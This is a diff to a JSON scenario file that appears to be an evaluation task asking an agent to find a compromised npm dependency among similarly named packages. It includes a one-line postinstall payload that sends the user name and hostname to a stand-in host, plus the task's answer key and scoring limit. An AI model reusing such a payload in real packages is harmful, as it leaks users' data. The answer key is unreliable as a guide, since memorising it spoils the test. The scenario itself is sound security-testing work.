@@ -1,5 +1,5 @@
 {
-  "description": "A dependency confusion attack caused a public package to be installed instead of an expected internal utility package. Investigate whether any dependency is compromised.",
+  "description": "A dependency confusion attack caused a public package to be installed instead of an expected internal utility package. Multiple packages in the manifest have similar names. Investigate to identify which dependency is compromised.",
 
   "project": {
     "name": "enterprise-dashboard"
@@ -9,7 +9,9 @@
     "dependencies": {
       "express": "^4.18.0",
       "react": "^18.2.0",
-      "company-utils": "1.0.0"
+      "company-utils": "1.0.0",
+      "internal-logger": "2.3.1",
+      "shared-components": "3.4.0"
     }
   },
 
@@ -18,14 +20,49 @@
       "version": "4.18.0",
       "maintainers": ["express-team"],
       "published": "2023-01-10",
-      "weekly_downloads": 22000000
+      "weekly_downloads": 22000000,
+      "homepage": "https://expressjs.com",
+      "repository": "expressjs/express"
     },
 
     "react": {
       "version": "18.2.0",
       "maintainers": ["meta-open-source"],
       "published": "2023-02-15",
-      "weekly_downloads": 38000000
+      "weekly_downloads": 38000000,
+      "homepage": "https://react.dev",
+      "repository": "facebook/react"
+    },
+
+    "internal-logger": {
+      "version": "2.3.1",
+      "maintainers": ["corp-infra-team"],
+      "published": "2025-11-03",
+      "weekly_downloads": 1240,
+      "description": "Internal logging utility for enterprise applications",
+      "homepage": "https://github.com/enterprise-tools/internal-logger",
+      "repository": "enterprise-tools/internal-logger",
+      "install_scripts": {},
+      "version_history": [
+        {"version": "2.2.0", "date": "2025-08-15"},
+        {"version": "2.3.0", "date": "2025-10-01"},
+        {"version": "2.3.1", "date": "2025-11-03"}
+      ]
+    },
+
+    "shared-components": {
+      "version": "3.4.0",
+      "maintainers": ["ui-team"],
+      "published": "2026-01-12",
+      "weekly_downloads": 847,
+      "description": "Shared UI components library",
+      "homepage": "https://github.com/company-ui/shared-components",
+      "repository": "company-ui/shared-components",
+      "install_scripts": {},
+      "version_history": [
+        {"version": "3.3.2", "date": "2025-11-20"},
+        {"version": "3.4.0", "date": "2026-01-12"}
+      ]
     },
 
     "company-utils": {
@@ -33,32 +70,72 @@
       "maintainers": ["unknown_dev42"],
       "published": "2026-03-21",
       "weekly_downloads": 93,
+      "description": "Common utility functions (NOT OFFICIAL)",
+      "homepage": "https://npmjs.com/package/company-utils",
+      "repository": "unknown/company-utils",
       "install_scripts": {
         "postinstall": "node install.js"
       },
-      "source_preview": "const https=require('http'); https.get('http://pkg-sync-data.com/log?user='+process.env.USER)",
+      "source_preview": "const https=require('http'); https.get('http://pkg-sync-data.com/log?user='+process.env.USER+'&host='+require('os').hostname())",
       "suspicious": true,
-      "attack_vector": "dependency_confusion"
+      "attack_vector": "dependency_confusion",
+      "version_history": [
+        {"version": "1.0.0", "date": "2026-03-21", "note": "First public release - package name conflicts with expected internal package"}
+      ]
     }
   },
 
   "audit_output": {
-    "vulnerabilities_found": 0
+    "vulnerabilities_found": 0,
+    "note": "No CVEs detected. Package name conflicts not detected by standard tooling."
   },
 
   "git_log": [
     "updated internal package references",
     "ci cleanup",
-    "minor dependency refresh"
+    "minor dependency refresh",
+    "fix: update company-utils import path",
+    "refactor: consolidate utility functions"
   ],
 
   "network_logs": {
     "install": [
       {
+        "timestamp": "2026-03-22T10:15:03Z",
+        "url": "https://registry.npmjs.org/express",
+        "method": "GET",
+        "status": 200
+      },
+      {
+        "timestamp": "2026-03-22T10:15:04Z",
+        "url": "https://registry.npmjs.org/react",
+        "method": "GET",
+        "status": 200
+      },
+      {
+        "timestamp": "2026-03-22T10:15:05Z",
+        "url": "https://registry.npmjs.org/company-utils",
+        "method": "GET",
+        "status": 200
+      },
+      {
+        "timestamp": "2026-03-22T10:15:07Z",
+        "url": "https://registry.npmjs.org/internal-logger",
+        "method": "GET",
+        "status": 200
+      },
+      {
+        "timestamp": "2026-03-22T10:15:08Z",
+        "url": "https://registry.npmjs.org/shared-components",
+        "method": "GET",
+        "status": 200
+      },
+      {
+        "timestamp": "2026-03-22T10:15:12Z",
         "url": "http://pkg-sync-data.com/log",
         "method": "GET",
         "flagged": true,
-        "note": "Unexpected outbound request during install from a package expected to be internal-only"
+        "note": "Unexpected outbound request from package expected to be internal-only"
       }
     ]
   },
@@ -67,6 +144,7 @@
     "compromised_packages": ["company-utils"],
     "attack_vectors": {
       "company-utils": "dependency_confusion"
-    }
+    },
+    "max_steps_for_full_score": 8
   }
 }
